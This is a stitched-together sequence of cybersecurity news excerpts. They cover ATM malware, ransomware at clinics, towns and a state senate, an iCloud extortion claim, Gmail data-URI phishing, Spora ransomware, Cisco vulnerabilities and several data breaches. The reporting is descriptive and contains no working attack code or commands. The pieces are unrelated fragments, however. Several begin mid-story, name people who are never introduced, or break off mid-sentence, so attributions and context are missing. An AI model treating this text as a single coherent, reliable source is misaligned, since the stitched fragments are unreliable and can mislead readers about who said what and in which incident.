The flaws are far-reaching and affect various implementations of Acrobat DC, Acrobat Reader DC, Acrobat 2017 and Acrobat Reader 2017 for macOS and Windows, in classic 2015, classic 2017 and continuous-track versions. All can be mitigated by updating to the most current versions of the software.

These ATM heists are the work of a group of hackers that's been active for years.
Most recently, starting 2016, this group has switched to using legitimate Windows apps and fileless malware to hack into government agencies and banks in at least 40 countries.
Because those attacks used stealthy techniques that left a minimal footprint on infected servers, investigators weren't able to detect what the crooks were after.
Nevertheless, they suspected the hackers stole data from infected systems, albeit they didn't know what data.
More clues about these attacks came to light only recently.
Security researchers from Kaspersky Lab, the ones who identified the initial attacks this February, believe they uncovered the purpose of some of the bank hacks.
Presenting at the Security Analyst Summit (SAS) held these days in St. Maarten, Kaspersky Lab researchers said crooks broke into the networks of various banks using various exploits, where they used legitimate Windows tools and PowerShell malware to escalate their access to nearby systems.
Their target was the system that managed the bank's ATM network.
Hackers used this system's remote management feature to connect to the ATMs via RDP.
They then transferred and installed a new breed of ATM malware on these machines, which Kaspersky Lab experts called ATMitch.
This malware worked by reading a local command.txt file for instructions.
When attackers knew they had partners in front of specific ATMs, they'd upload instructions to the command.txt file and the malware would execute them, spewing out cash.
Based on log entries, researchers believe the ATM printed on its screen the words ""Catch some money, bitch!""
It is unknown how many ATMs attackers emptied using this technique because the malware would self-delete once the attack would end, cleaning up all its files.
It was only by accident that on one ATM the malware left behind a file named ""tv.dll.""
After further digging around, researchers were able to discover how the malware worked and traced it back to banks compromised by the same group they uncovered this past February.
Right now, researchers tracked down only two incidents with ATMitch, to a bank in Russia and one in Kazakhstan, but they believe that many more have also taken place.
The only problem is that detecting either the hacked bank or the hacked ATM is almost impossible as most of the malicious behavior takes place via self-deleting malware and malicious PowerShell scripts executing in memory, without leaving any artifacts on disk.
Once the bank server/computer or the AMT is rebooted, most of the clues are wiped from memory.
ATMitch is not the first ATM malware strain that works by forcing ATMs to empty their cash dispensers.
Other strains are GreenDispenser, and recent versions of the Alice and Ploutus ATM malware.

While the company was able to avoid falling victim to the ransomware, the attackers may have been able to access patient data.
On February 6, 2017, an employee noticed that a virus had begun encrypting the practice's servers.
The encryption process was slowed by the company's anti-virus software, and ABCD's IT company was able to take its servers offline and identify the virus as Dharma Ransomware, a variant of Crysis for which decryption tools are available.
""ABCD's IT company reported that these virus strains typically do not exfiltrate ('remove') data from the server; however, exfiltration could not be ruled out,"" the company said in a statement.
""Also, during the analysis of ABCD's servers and computers, suspicious user accounts were discovered suggested that hackers may have accessed portions of ABCD's network.""
The IT company was able to remove the virus and all corrupt data from its servers, and successfully restored all affected data from a secure backup.
""As a result, no confidential information was lost or destroyed, including protected health information,"" the company said.

""There have not been any breaches in any of Apple's systems including iCloud and Apple ID,"" an Apple representative said in an emailed statement.
""The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services.""
A group calling itself the Turkish Crime Family claims to have login credentials for more than 750 million icloud.com, me.com and mac.com email addresses, and the group says more than 250 million of those credentials provide access to iCloud accounts that don't have two-factor authentication turned on.
The hackers want Apple to pay $700,000 -- $100,000 per group member -- or ""$1 million worth in iTunes vouchers.""
Otherwise, they threaten to start wiping data from iCloud accounts and devices linked to them on April 7.
In a message published on Pastebin Thursday, the group said it also asked for other things from Apple, but they don't want to make public.
""We're actively monitoring to prevent unauthorized access to user accounts and are working with law enforcement to identify the criminals involved,"" the Apple representative said.
""To protect against these type of attacks, we recommend that users always use strong passwords, not use those same passwords across sites and turn on two-factor authentication.""
However, the unusually high numbers advanced by the group are hard to believe.
It's also hard to keep up with the group's claims, as at various times over the past few days, it has released conflicting or incomplete information that it has later revised or clarified.
The group claims that it started out with a database of more than 500 million credentials that it has put together over the past few years by extracting the icloud.com, me.com and mac.com accounts from stolen databases its members have sold on the black market.
The hackers also claim that since they've made their ransom request public a few days ago, others have joined in their effort and shared even more credentials with them, putting the number at more than 750 million.
The group claims to be using 1 million high-quality proxy servers to verify how many of the credentials give them access to unprotected iCloud accounts.
Apple provides two-factor authentication for iCloud, and accounts with the option turned on are protected even if their password is compromised.
The latest number of accessible iCloud accounts advanced by the Turkish Crime Family is 250 million.
That's an impressive ratio of one in every three tested accounts.
The largest ever data breach was from Yahoo with a reported 1 billion accounts.
""At best they’ve got some reused credentials, but I wouldn’t be surprised if it’s almost entirely a hoax.""
Hunt hasn't seen the actual data that the Turkish Crime Family claims to have, and there isn't much evidence aside from a YouTube video showing a few dozen email addresses and plain text passwords.
However, he has significant experience with validating data breaches and has seen many bogus hacker claims over the years.
To be on the safe side, users should follow Apple's advice and create a strong password for their account and turn on two-factor authentication or two-step verification at the very least.

Zaufana Trzecia Strona, a local Polish news site, first reported the attacks late Friday, last week.
The news site said that during the past week, the security teams at several, yet unnamed, Polish banks detected downloads of suspicious files and encrypted traffic going to uncommon IPs situated in many foreign countries.
As employees at different banks started looking into their systems, they found malware installed on numerous workstations and even some servers.
The JavaScript code worked by opening a hidden iframe and forcibly downloading a file on the victim's computers.
Users that discovered and executed this file would install a remote access trojan (RAT) on their computers.
According to Zaufana Trzecia Strona, this malware has a zero detection rate on VirusTotal and appears to be a new malware strain, never-before-seen in live attacks.
KNF's staff have cleaned their site and along with the affected banks, have reported the incidents to CERT.pl.
The affected Polish banks said the malware that infected their computers and servers encrypted its outgoing traffic and they weren't able to tell what the attackers stole.
Banks reassured their clients and said they haven't detected any unauthorized transactions, but only the mysterious outgoing traffic.
Local media believes the attack is the work of a foreign intelligence agency.
A more believable theory would be that this is the work of one of the many cyber-crime syndicates specialized in cyber-thefts from financial institutions.
The attacks have the signs of classic network reconnaissance operations, where hackers gather intelligence in order to create a map of a victim's network before launching their final assaults.

Wasaga Beach has paid part of the ransom to hackers who took over the town's computer system earlier this month.
The computer ransomware attack started Sunday, April 29th. Staff discovered they couldn't access town data when the arrived on Monday.  
CAO George Vadeboncoeur says some of the data has been retrieved, but he's not saying how much money the town has had to pay the hackers. He says the town doesn't actually know who the ransomware virus attackers are. He does say they appear to be in a time zone six hours different from ours, and English is not their first language.
Vadeboncoeur says town council will get a report on the ransom paid at a meeting once the situation is resolved. He says he doesn't know yet when that will be, but he says some of the town's data has now been retrieved.

POLICE have launched an investigation after a number of patients have had their personal details accessed by a member of staff at Crosshouse Hospital.
Those affected, believed to be mainly women, were notified that information, including their phone numbers and addresses, had been accessed and that the member of staff who breached their privacy had ‘no legitimate clinical or administrative requirement’.
The breach came from within information held in the Radiology Information System and patients affected had all recently been referred for an X-ray.  
A member of staff has been 'excluded from work' following the breach which took place between April and September of this year. 
Dr Alison Graham, Medical Director for the NHS Ayrshire & Arran said: ""NHS Ayrshire & Arran has been made aware of a member of staff inappropriately accessing patient records. This individual is currently excluded from work.""
We are currently investigating and are contacting a number of patients to ascertain the extent of this breach. We wish to apologise to anyone affected by this. We take patient confidentially extremely serious and will ensure a full investigation is conducted.
""We are working closely with Police Scotland and the Information Commissioner’s Office. As this is an ongoing police investigation, we are not able to confirm any further details.""

The Pennsylvania Senate Democrats have been hit by a ransomware attack that has locked senators and employees out of their computer network since the early morning hours of Friday, state officials told NBC News.
In a statement, Sen. Jay Costa, the Democratic leader, said the Democrats were working with law enforcement agencies and Microsoft to resolve the problem. He did not say what payment has been demanded to unlock the data, or whether the attackers had suggested any political motive.
In a ransomware attack, hackers inject a network with malware that typically encrypts important data, and then demand payment in exchange for a key that releases the data. They threaten to destroy the data if they aren't paid.
The Democratic senators in the state capital of Harrisburg are on their own computer network and there is no indication that other state agencies of the Republicans have been affected, said a state official who declined to be identified. The official said the Democrats had no idea whether they were targeted for any specific reason.
A spokeswoman for the FBI was looking into whether that agency had been called in. A spokeswoman for the Pennsylvania Democrats, Stacey Witalec, declined to say whether the data was backed up elsewhere or whether the attackers had identified themselves or any motive.

With everything that’s gone down in 2016 it’s easy to forget Tim Cook’s and Apple’s battle with the FBI over data encryption laws.
Apple took a strong stance though, and other tech giants followed suite leading to a victory of sorts for (the little guy in) online privacy.
In this era of web exposure, it was a step in the right direction for those who feel our online identities are increasingly vulnerable on the web.
All of this stands for little though when a security flaw in your operating system allows carefully encrypted messages to be effectively decrypted offline.
That’s what happened to Apple with its iOS 9.2 operating system.
Though the patches that ensued largely fixed the problem, the whole issue has understandably left iOS users with questions.
What really happened and are we at immediate risk?
A paper released in March by researchers at John Hopkins University exposed weaknesses in Apple’s iMessage encryption protocol.
It was found that a determined hacker could intercept the encrypted messages between two iPhones and reveal the 64-digit key used to decrypt the messages.
As iMessage doesn’t use a Message Authentication Code (MAC) or authenticated encryption scheme, it’s possible for the raw encryption stream, or “ciphertext” to be tampered with.
iMessage instead, uses an ECDSA signature which simulates the functionality.
It’s still no easy feat exploiting the security flaw detailed by the researchers.
The attacker would ultimately have to predict or know parts of the message they are decrypting in order to substitute these parts in the ciphertext.
Knowing whether the substitution has been successful though, is a whole other process which may only be possible with attachment messages.
The full details of the security flaw, and the complex way it can be exploited are detailed in the John Hopkins paper.
The paper includes the recommendation that, in the long run, “Apple should replace the entirety of iMessage with a messaging system that has been properly designed and formally verified”.
One thing that should be made clear is that these weaknesses were exposed as a result of months of investigation by an expert team of cryptologists.
The type of hacker that would take advantage of these weaknesses would undeniably be a sophisticated attacker.
That of course doesn’t mean that Apple shouldn’t take great measures to eradicate this vulnerability in their system.
Your messages, though, are not immediately at risk of being decrypted, and much less if you’ve installed the patches that came with iOS 9.3 and OS X 10.11.4 (though they don’t completely fix the problem).
Tellingly, the flaws can’t be used to exploit numerous devices at the same time.
As already mentioned, the process that was exposed by the John Hopskins paper is incredibly complex and relies on various steps that are by no means easy to complete successfully.

On Friday, a cache of hacking tools allegedly developed by the US National Security Agency was dumped online.
The news was explosive in the digital security community because the tools contained methods to hack computers running Windows, meaning millions of machines could be at risk. Security experts who tested the tools, leaked by a group called the Shadow Brokers, found that they worked. They were panicked:
This is really bad, in about an hour or so any attacker can download simple toolkit to hack into Microsoft based computers around the globe.
— Hacker Fantastic (@hackerfantastic) April 14, 2017
But just hours later, Microsoft announced that many of the vulnerabilities were addressed in a security update released a month ago.
“Today, Microsoft triaged a large release of exploits made publicly available by Shadow Brokers,” Philip Misner, a Microsoft executive in charge of security wrote in a blog post. “Our engineers have investigated the disclosed exploits, and most of the exploits are already patched.”
Misner’s post showed that three of nine vulnerabilities from the leak were fixed in a March 14 security update. As Ars Technica pointed out, when security holes are discovered, the individual or organization that found them is usually credited in the notes explaining the update. No such acknowledgment was found in the March 14 update. Here’s a list of acknowledgments for 2017, showing credit for finding security problems in almost every update.
One theory among security practitioners is that the NSA itself reported the vulnerabilities to Microsoft, knowing that the tools would be dumped publicly. Microsoft told ZDNet that it might not list individuals who discover flaws for a number of reasons, including by request from the discoverer.
The US government has not commented on this leak, though previous leaks by the Shadow Brokers claiming to be NSA hacking tools were confirmed at least in part by affected vendors and NSA whistleblower Edward Snowden.

According to Fortinet researcher Kai Lu, the one who discovered this new threat, the ransomware appears to be targeting only Russian-speaking users, as its ransom note is only available in Russian.
A translated version of the ransom note is available below.
There are several things that stand out about this threat.
The first is the humongous ransom demand it asks victims for, which is 545,000 Russian rubles (~$9,100).
This ransom demand is between 10 and 100 times over the price of some phones, and most users who can't remove the screen locker will instead choose to buy a new phone rather than paying the crooks.
To pay the ransom, victims have to enter their credit card number directly in the ransom screen, a technique very different from how other ransomware operators like to work, which is via Bitcoin, Tor, or gift cards.
The other thing that sets this ransomware apart is the usage of the Google Cloud Messaging (GCM) platform, now renamed in Firebase Cloud Messaging.

An unsecured backup drive has exposed thousands of US Air Force documents, including highly sensitive personnel files on senior and high-ranking officers.
Security researchers found that the gigabytes of files were accessible to anyone because the internet-connected backup drive was not password protected.
The files, reviewed by ZDNet, contained a range of personal information, such as names and addresses, ranks, and Social Security numbers of more than 4,000 officers.
Another file lists the security clearance levels of hundreds of other officers, some of whom possess ""top secret"" clearance, and access to sensitive compartmented information and codeword-level clearance.
Phone numbers and contact information of staff and their spouses, as well as other sensitive and private personal information, were found in several other spreadsheets.
The drive is understood to belong to a lieutenant colonel, whose name we are not publishing.
ZDNet reached out to the officer by email but did not hear back.
The data was secured last week after a notification by MacKeeper security researcher Bob Diachenko.
Among the most damaging documents on the drive included the completed applications for renewed national security clearances for two US four-star generals, both of whom recently had top US military and NATO positions.
Both of these so-called SF86 applications contain highly sensitive and detailed information, including financial and mental health history, past convictions, relationships with foreign nationals, and other personal information.
These completed questionnaires are used to determine a candidate's eligibility to receive classified material.
Several national security experts and former government officials we spoke to for this story described this information as the ""holy grail"" for foreign adversaries and spies, and said that it should not be made public.
For that reason, we are not publishing the names of the generals, who have since retired from service.
Nevertheless, numerous attempts to contact the generals over the past week went unreturned.
""Some of the questions ask for information that can be very personal, as well as embarrassing,"" said Mark Zaid, a national security attorney, in an email.
The form allows prospective applicants to national security positions to disclose arrests, drug and alcohol issues, or mental health concerns, among other things, said Zaid.
Completed SF86 forms aren't classified but are closely guarded.
These were the same kinds of documents that were stolen in a massive theft of sensitive files at the Office of Personnel Management, affecting more than 22 million government and military employees.
One spreadsheet contained a list of officers under investigation by the military, including allegations of abuses of power and substantiated claims of wrongdoing, such as wrongfully disclosing classified information.
Nevertheless, this would be the second breach of military data in recent months.
of Defense subcontractor, was the source of a large data exposure of military personnel files of physical and mental health support staff.
Many of the victims involved in the data leak are part of the US Special Operations Command (SOCOM), which includes those both formerly employed by US military branches, such as the Army, Navy, and Air Force, and those presumably still on active deployment.
It's not known how long the backup drive was active.

If there’s one thing that can be counted on to happen every year around tax season — besides the ongoing tax preparation service commercials — it’s fraud.
Whether it’s selling W2 forms online or sending malicious emails that look like they are from the IRS, cybercriminals tend to keep themselves busy this time of year.
Rick Holland, VP of strategy at Digital Shadows, joined this week’s Hacker Tracker to highlight how cybercriminals are utilizing the dark web to support their tax fraud campaigns.
Earlier this year, the Treasury Inspector General for Tax Administration reported that there was a reduction in the number of fraudulent tax returns identified between 2013 and 2015.
On the other hand, around that same time the IRS released data showing that phishing and malware incidents in the 2016 tax season increased by 400 percent.
Noting that the number of identified fraudulent returns was not indicative of the overall levels of tax fraud occurring, Digital Shadows set out to reconcile two very different perspectives on the same problem.
In response, the external digital risk management team recently released its research assessing dark web and criminal chatter related to tax fraud so far this year.
As of February, the number of mentions in 2017 so far was already over 40 percent of the 2016 total.
Rick Holland, VP of strategy at Digital Shadows, explained that cybercriminals are often using the dark web marketplaces to sell W2s for as little as $4, which include a victim’s full information that can then be used for whatever campaign the cybercriminal is going to run.
In fact, he noted that often cybercriminals capitalize on phishing and malware schemes during this time by using the term “tax refund” in an email subject of a message that looks like it’s from the IRS.
However, those malicious emails are actually just delivering malware to a computer for other purposes, maybe to participate in a botnet or something similar.
“Sometimes it’s easy to think of the personal fraud that’s being committed, and certainly that is happening, but I think it’s important to remember that it goes much broader as far as what the adversaries are doing,” Holland said.
At the end of the day, fraudsters are doing everything they can increase the likelihood of their social engineering being successful.
What’s Next In Tax Fraud
Holland stressed how important it is for both consumers and businesses to under that there are differences in the types of cyber campaigns criminals perpetrate during tax season and that the threat of fraud can be much more encompassing during this time of year.
Cybercriminals aren’t always going to go after credit card information, because they don’t have to.
With increased sophistication and social engineering tactics, these criminals are not limited to relying on payment data alone to make money.

VILLAGE OF NASHOTAH - The village recently paid an unidentified hacker a $2,000 ransom to decrypt its computer system after a hack in late November that left some residents' personal information exposed.
Village President Richard Lartz said Thursday, Dec 7, that the hack ""totally encrypted"" Nashotah's computer files, making them inaccessible to staff. He said the only information that was exposed during the breach were citizens' names and driver's license numbers, and possibly their addresses. 
Social Security numbers and other sensitive information was not compromised. 
""The only information that got out was voter rolls,"" Lartz said, emphasizing that neither he nor village staff know whether that information was used or dispersed by the hacker.

A former Chicago Public Schools worker faces several felony charges after officials allege the worker stole personal information on about 80,000 employees, volunteers and vendors from a CPS database.
The former worker, Kristi Sims, was arrested Thursday; officers recovered the stolen files after executing search warrants, according to CPS and Chicago police officials. Sims, 28, is a former contractor who handled administrative tasks for the Office of Safety and Security.
Sims was ordered released on her own recognizance at a bond hearing Friday at the Leighton Criminal Court Building by Judge Sophia Atcherson; Sims also was ordered not to access to the internet while the case continues.
In a letter to employees Thursday evening, CPS Chief Operating Officer Arnie Rivera said the district learned of the massive data breach Wednesday, the day after the information was stolen.
Among the data stolen were names, employee ID numbers, phone numbers, addresses, dates of birth, criminal arrest histories and DCFS findings. Social Security numbers were not taken, Rivera said.
“There was no indication that the information, which was in the individual’s possession for approximately 24 hours, was used or disseminated to anyone in any way,” Rivera added.
A CPS spokesman referred questions about the criminal charges to Chicago police, but Rivera said “CPS will work to ensure the individual is prosecuted to the fullest extent of the law.”
CPD spokesman Anthony Guglielmi said Sims is also suspected of deleting the targeted files from the CPS database after they were stolen.
The digital equipment seized in the warrant is being analyzed, and a search warrant is underway for Sims’s email account, Guglielmi said. Though police say they don’t believe anyone other than Sims was in possession of the data, they hope to learn more about what might have been done with the information.
This latest CPS data breach comes only a few months after the school district mistakenly sent a mass email that linked to the private information of thousands of students and families.
The email invited families to submit supplemental applications to selective enrollment schools. Attached at the bottom of the email was a link to a spreadsheet with the personal data of more than 3,700 students and families.
In that incident, CPS apologized for the “unacceptable breach of both student information and your trust” and asked recipients of the email to delete the sensitive information. The data included children’s names, home and cellphone numbers, email addresses and ID numbers.

Privacy advocates say tech companies are becoming more brazen about collecting users' location data and personal information.
February 6, 2017
—For just a few days last month, a photo filter app called Meitu, which turns selfies into pearl-skinned, doe-eyed Anime characters, enthralled the social media world.
But Meitu faded as quickly as it rose to internet fame after cybersecurity researchers exposed what was really behind the app.
Meitu’s application program interfaces (API) revealed code that collected a bevy of personal data that goes far beyond what typical photo apps gather.
It amassed users' precise locations, call information, carrier information, and Wi-Fi connections.
The company explained that it collected all that data to ""optimize app performance"" and better engage users.
As smartphones become ubiquitous, app makers are becoming more brazen about collecting personal data, say experts and privacy advocates.
And while iPhones and Android devices have limited privacy settings, most consumers remain in the dark about what companies are collecting and how they are using that information.
""There's been erosion of privacy over the past few years.""

But sometimes that simple precaution isn't enough.
A case in point is a dangerous phishing technique targeting Gmail users that first surfaced about one year ago but has begun gaining steam in recent weeks.
Wordfence, the maker of a security plugin for Wordpress, described the phishing attack as beginning with an adversary sending an email to a target’s Gmail account.
The email typically will originate from someone on the recipient’s contact list whose own account had previously been compromised.
The email comes with a subject header and a screenshot or image of an attachment that the sender has used in a recent communication with the recipient.
When the recipient clicks on the image, a new tab opens with a prompt asking the user to sign into Gmail again.
The fully functional phishing page is designed to look exactly like Google’s page for signing into Gmail.
The address bar for the page includes mention of accounts.google.com, leading unwary users to believe the page is harmless, Wordfence CEO Mark Maunder wrote.
""Once you complete sign-in, your account has been compromised,"" he said.
In reality, the fake login page that opens up when a user clicks on the image is actually an inline file created using a scheme called Data URI.
When users enter their Gmail username and password on the page, the data is sent to the attacker.
The speed at which the attackers sign into a compromised account suggest that the process may be automated, or that they may have a team standing by to access accounts as they get compromised.
""Once they have access to your account, the attacker also has full access to all your emails including sent and received at this point and may download the whole lot,"" Maunder said.
What makes the phishing technique dangerous is the way the address bar displays information when users click on the screenshot of the attachment, he told Dark Reading.
In this case, by including the correct host name and “https//” in the address bar, the attackers appear to be having more success fooling victims into entering their credential data on the fake Gmail login page, he says.
Instead, all of the content in the address bar is of the same color and is designed to convince users that the site is harmless.
""If you aren’t paying close attention, you will ignore the ‘data:text/html’ preamble and assume the URL is safe.""
Google said in a statement that it's working on mitigations to such an attack.
""We're aware of this issue and continue to strengthen our defenses against it,"" Google said.
""We help protect users from phishing attacks in a variety of ways, including: machine learning based detection of phishing messages, Safe Browsing warnings that notify users of dangerous links in emails and browsers, preventing suspicious account sign-ins, and more.
Users can also activate two-step verification for additional account protection.""
Users can also mitigate the risk of their accounts being compromised via phishing by enabling two-factor authentication.
""What makes this unique is the fact that none of the traditional browser indicators that would identify a possible fraudulent site are present,"" says Robert Capps, vice president of business development at NuData Security.
The attack underscores the need for Web browser makers to rethink the trust signals they use to inform users about a danger webpage or exploit.
""How users interpret these signals should be thoroughly understood,"" he says.
""Entraining users to rely on signals may have unintended consequences that attackers can use to exploit customers.""

Discovered at the start of the year, Spora distinguishes itself from similar threats by a few features, such as the option to work offline, and a ransom payment portal that uses ""credits"" to manage Bitcoin fees.
Another of those unique features is a real-time chat window where victims can get in contact with ransomware operators.
By tweaking the ransomware infection ID, security researchers can access the ransom payment page of different Spora victims.
This has allowed researchers to keep track of conversations between victims and Spora operators.
As stated in our original article about Spora, the criminals behind this ransomware operation consider themselves ""professionals"" and appear to have considerable experience in running ransomware campaigns.
The thing that stood out for us in the beginning, and is still valid even today, is that the Spora gang pays a lot of attention to customer support.
They provide help in both English and Russian and are very attentive not to escalate conversations with angry victims, always providing appropriate and timely responses to any inquiries.
Security researcher MalwareHunter has spotted a few interesting conversations in the Spora ransom payment portal in the past few days.
First and foremost, Spora authors have been very lenient to victims that couldn't pay the ransom, often offering to extend or even disable the payment deadline altogether.
Second, Spora authors had been offering discounts, free decryptions of important files and deadline extensions for people who were willing to leave a review of their support service on the Bleeping Computer Spora ransomware thread.
At the time of writing, we haven't observed any users taking them on this offer and posting such reviews on our forum.
The reason why the Spora crew asks customers for reviews is so other victims can read about their story and feel confident that if they pay, they'll receive their files back.
This is a smart marketing move, since it builds trust in their service.
Many times, other ransomware authors don't always provide a way for victims to recover files, and more and more people now know there's a high chance that paying the ransom won't always recover their files.
MalwareHunter cites one case where the Spora gang has offered a 10% discount to a company that suffered Spora infections on more than 200 devices.

Recently we’ve been writing about LastPass more than seems healthy.
March saw two rounds of serious flaws made public by Google’s Tavis Ormandy (quickly fixed), which seemed like a lot for a single week. Days ago, news emerged of a new issue (also fixed) in the company’s two-factor/two-step authentication (2FA) security.
To coin a phrase, all serious flaws are serious – but some are more serious than others.
This one matters for two reasons, only one of which will sound flippant: it wasn’t discovered by Tavis Ormandy, who at times has seemed to be writing a novella on flaw-hunting with the company’s name on it.
Another researcher with a taste for LastPass, researcher Martin Vigo, uncovered the latest issue, and it’s the 2FA bit of the story that explains the angst.
Two-factor authentication (a term that also refers to more convenient but less secure two-step verification) matters because it is the crown jewels of everyday security, especially for password managers such as LastPass.
The flaws are explained by Vigo in a slightly confusing way (one compromise was subsequently shown not to be exploitable) but cover overlapping weaknesses that might under specific circumstances allow 2FA to be bypassed when using Google’s Authenticator and QR codes.
Again a user being logged into LastPass at the time of an attack is entirely possible.
Significantly, LastPass quickly stopped using the login hash (used to authenticate the master password without having to know it) to retrieve Authenticator’s QR codes, and now sets a Cross-Site Request Forgery (CSRF) token to plug another weakness.
We still don’t know why LastPass has been plagued by so many issues in such a short space of time – perhaps it’s just a big-name target worth researching – but some of these weaknesses appear to be in its design, the result of decisions to do things in a certain way, probably some years in the past.

Nigerian scamsters have changed tactics as they target Indian people online, security experts have warned.
The fraudsters are no longer relying on phishing emails about lotteries and charity as bait, but are duping people on the pretext of partnering with MNCs (multinational companies), investing in herbal seed businesses and channelising foreign funds.
According to security agencies, there is a complete shift in the modus operandi of these Nigerian web gangs.
A senior Delhi Police Crime Branch officer said: 'The scamsters lure gullible targets via social networking sites such as Facebook. 
'They then pose as diplomats or MNC executives and entice their targets to invest in a global venture, which actually does not exist.
'Interestingly, all dealings are done at high-secured areas such as airport and five-star hotels to give an impression of being high-flyers and avoid the risk of getting into trouble.'
'There is no fixed narrative. Depending upon the profile of the target, the gang traps them. In the herbal seeds scam, the victim is approached online as a representative of an overseas pharmaceutical firm looking to source herbal seeds from local farmers through an agent. They promise the victim huge returns if they pay the agent upfront for the seeds. Then they disappear with the money,' said Uttar Pradesh Special Task Force's additional superintendent of police Triveni Singh.
One of the latest victims is Meerut's Varun Thapar, who lost Rs 3 lakh to a Nigerian gang. Thapar went to meet the gang members at a five star hotel in Mumbai and Delhi. 
He told Mail Today: 'The gang members contact through their international number or makes a WhatsApp call. The gang sounds so professional that it is difficult to make out that they are fraud. 
'I was trapped after getting a friend request from a Manchester-based female executive. I was given seed sample in Mumbai and later duped at a five-star hotel in Delhi. The trap was so perfect that I could not sense any foul play.'
During investigation, it was found that all the numbers used for communication were taken on fake identities. 
Police claim the gangs have developed a new trick, where they pose as diplomat or MNC executive and work in nexus with a local youth who helps them with logistics.

Cisco patches a severe flaw in switch deployment software that can be attacked with crafted messages sent to a port that's open by default.
Cisco has released patches for 34 vulnerabilities mostly affecting its IOS and IOS XE networking software, including three critical remote code execution security bugs.
Perhaps the most serious issue Cisco has released a patch for is critical bug CVE-2018-0171 affecting Smart Install, a Cisco client for quickly deploying new switches for Cisco IOS Software and Cisco IOS XE Software.
A remote unauthenticated attacker can exploit a flaw in the client to reload an affected device and cause a denial of service or execute arbitrary code.
Embedi, the security firm that found the flaw, initially believed it could only be exploited within an enterprise's network. However, it found millions of affected devices exposed on the internet.
""Because in a securely configured network, Smart Install technology participants should not be accessible through the internet. But scanning the internet has shown that this is not true,"" wrote Embedi.
""During a short scan of the internet, we detected 250,000 vulnerable devices and 8.5 million devices that have a vulnerable port open.""
Smart Install is supported by a broad range of Cisco routers and switches. The high number of devices with an open port is probably because the Smart Install client's port TCP 4786 is open by default.
This situation is overlooked by network admins, Embedi said. The company has also published proof-of-concept exploit code, so it probably will be urgent for admins to patch.
An attacker can exploit the bug by sending a crafted Smart Install message to these devices on TCP port 4786, according to Cisco.
Embedi discovered the flaw last year, landing it an award at the GeekPwn conference in Hong Kong last May, and reported it to Cisco in September.
Cisco's internal testing also turned up a critical issue in its IOS XE software, CVE-2018-0150, due to an undocumented user account that has a default username and password. Cisco warns that an attacker could use this account to remotely connect to a device running the software.
Cisco engineers also found CVE-2018-0151, a remote code execution bug in the QoS subsystem of IOS and IOS XE.
""The vulnerability is due to incorrect bounds checking of certain values in packets that are destined for UDP port 18999 of an affected device. An attacker could exploit this vulnerability by sending malicious packets to an affected device,"" writes Cisco.
All three bugs were given a CVSS score of 9.8 out of 10.

 After observing attacks on customers, Cisco is telling users to install the fix for a recently disclosed denial-of-service flaw affecting a number of its security appliances.
The flaw, tracked as CVE-2018-0296, was detailed in an advisory on June 6 and affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software.
""Cisco strongly recommends that customers upgrade to a fixed software release to remediate this issue,"" Omar Santos of Cisco's Product Security Incident Response Team warned on June 22.
The attacks follow the publication of proof-of-concept exploits for the flaw. Santos notes that a unauthenticated, remote attacker could cause a device to reload unexpectedly and cause a denial-of-service (DoS) condition.

 Additionally, an exploit could cause a DoS or unauthenticated disclosure of information. However, Santos said: ""Only a denial-of-service condition (device reload) has been observed by Cisco.""
Cisco has also updated the advisory for CVE-2018-0296 with details about the attacks.
The researcher who found the flaw, Michał Bentkowski from Polish security firm Securitum, gave a brief description of the root cause in a tweet shortly after Cisco disclosed the bug.
Bentkowsky reported the issue to Cisco as a way to use directory-traversal techniques to disclose information to an unauthenticated attacker.
Cisco labeled its primary impact as a DoS condition, but said it is possible that on certain releases of ASA a device reload would not occur, yet still allow an attacker to use directory-traversal techniques to view sensitive system information.
Bleeping Computer identified two proof-of-concept exploits for CVE-2018-0296 on GitHub. One attempts to extract user names from Cisco ASA. The other states: ""If the web server is vulnerable, the script will dump in a text file both the content of the current directory, files in +CSCOE+ and active sessions.""

Retina-X Studios, the makers of several consumer-grade monitoring products, have finally announced that they have suffered a data breach.
Retina-X and FlexiSpy, another spyware maker, were attacked by two hackers / hacker groups that revealed last week how they went about compromising the companies’ assets and made off with customer and other data. 
“A hacker known for SQL exploits of great magnitude was able to find a weakness in a decompiled and decrypted version of a now-discontinued product. The vulnerability hidden inside the coded software led to a breach of the database and the eventual exploit by unauthorized individuals,” the company noted.
“According to the report, the attacker was able to break into a server that held database tables for Net Orbit, PhoneSheriff and TeenShield. The tables held information such as login usernames, subscription keys, device metadata, text messages, GPS locations, contacts’ information, apps installed and website logs. A third-party photo storage account was also breached. Only accounts created before February 21st, 2017 were affected.”
They were quick to point out that no payment information was compromised, and they say that the attacker has not publicly released the stolen data – and he seemingly does not plan to.
They are also trying to differentiate itself from the other victim (FlexiSpy), by saying that their software can’t be used to monitor individuals that the monitorer has no legal right to keep under surveillance (e.g. their employees or their underage children), because this would violate their terms of service and the account would be terminated. 
“Our child and employee monitoring software shows up as an icon and in the Installed Apps list of devices. There are also notifications to let the user of the device know that activities are being monitored,” the company noted, while failing to mention that these notifications can be turned off and the icon removed.
They also did not mention how or how quickly they are able to discover that someone is using the software to perform illegitimate surveillance. For all we know, it could be weeks or months, but even days are too much for people who are spied on in this way.

After a week of being bruised and battered over elevated reputation and credit risks, the last thing the bankers attending The Australian Financial Review Banking and Wealth Summit needed was a reminder of the rising operational risks from cyber attacks.
But the straight-shooting chief executive of Insurance Australia Group, Peter Harmer, did not dodge the question when asked what his firm had found while trawling through the ""dark web"".
He said IAG had uncovered the personal details of customers belonging to one of the big four banks.
The information was being sold online for $25 per customer.
That suggests the systems of at least one major financial institution have been breached and customer data stolen.
Harmer was primed for this conversation about cyber risks at the Summit.
On Wednesday he had led the IAG board of directors on a tour of the company's cyber-security facility in Sydney.
He said any chief executive who believes they have a secure digital environment is ""completely oblivious to the threats that are out there"".
""We trawl our systems all the time looking for unusual activity,"" he said.
""We trawl the dark net looking for where our data might be up for sale, and it's amazing when you actually see what is being offered for sale.
All we've found is a couple of our employees' names and addresses, so our view is that we are reasonably confident with the analysis, and being able to thwart the hackers coming into our system.""
Harmer's most worrying revelation was that the global capacity for cyber protection was a measly $500 million.
He said for a business such as IAG, which has a market capitalisation of $14 billion, this amount of insurance ""would not even touch the sides"".
This made it imperative for companies to invest in defence efforts and avoid any major extraction of data by cyber attackers.
On Wednesday, bankers attending the summit were reminded of the lack of trust in the community towards financial institutions.

